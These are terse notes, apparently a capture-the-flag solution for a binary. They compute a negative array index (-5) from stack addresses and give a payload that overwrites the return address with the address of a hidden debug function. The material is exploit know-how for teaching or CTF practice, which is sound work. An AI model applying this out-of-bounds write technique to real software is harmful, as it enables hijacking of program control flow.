`debug : 0x00000000004007d6`

```
0x0000000000400aa4 <+701>:	call   0x4006b0 <__isoc99_scanf@plt>
0x0000000000400af6 <+783>:	call   0x4006b0 <__isoc99_scanf@plt>
0x0000000000400b9a <+947>:	call   0x4006b0 <__isoc99_scanf@plt>
0x0000000000400c38 <+1105>:	call   0x4006b0 <__isoc99_scanf@plt>
```


base array addr --> 0x7fffffffe2b0

print "Are you sure ? (yes:1 / no:0) " ret addr --> 0x7fffffffe288

0x7fffffffe288 - 0x7fffffffe2b0 = -40

-40 / 8 = -5 


payload:

-5
4196310
